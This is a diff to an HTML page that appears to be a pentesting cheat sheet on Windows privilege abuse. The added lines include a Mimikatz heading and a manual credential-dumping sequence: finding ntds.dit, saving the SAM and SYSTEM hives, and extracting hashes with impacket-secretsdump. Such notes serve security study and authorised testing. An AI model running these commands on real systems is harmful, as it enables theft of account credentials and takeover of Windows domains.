@@ -99,6 +99,7 @@
                 <a href="attacking.html">Attacking</a>
                 <a href="lateralMovement.html">Lateral Movement</a>
                 <a href="metodologie.html">Methodology</a>
+                <a href="adset.html">set AD Flow</a>
             </div>
         </div>
 
@@ -550,6 +551,8 @@ whoami /priv | findstr SeAssignPrimaryTokenPrivilege
 
             <h2 class="sub-title">SeDebugPrivilege</h2>
 
+            <h3 style="color:aquamarine">Mimikatz</h3>
+
             <p><strong>Meaning:</strong> Can debug SYSTEM processes</p>
 
             <p><strong>Abuse:</strong></p>
@@ -581,7 +584,20 @@ sekurlsa::logonpasswords
             <p><strong>Result:</strong> Credentials / NTLM hashes</p>
 
             <hr>
-
+            <h3 style="color:aquamarine">Manual</h3>
+            <p>First, we need to get desired files</p>
+                        <pre><code>
+Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Filter ntds.dit
+C:\Windows\NTDS\ntds.dit
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+            </code></pre>
+                        <p>We download it to our kali, the we do the following</p>
+                        <pre><code>
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+            </code></pre>
+            <hr>
 
             <!-- ===================== SEBACKUP ===================== -->
 
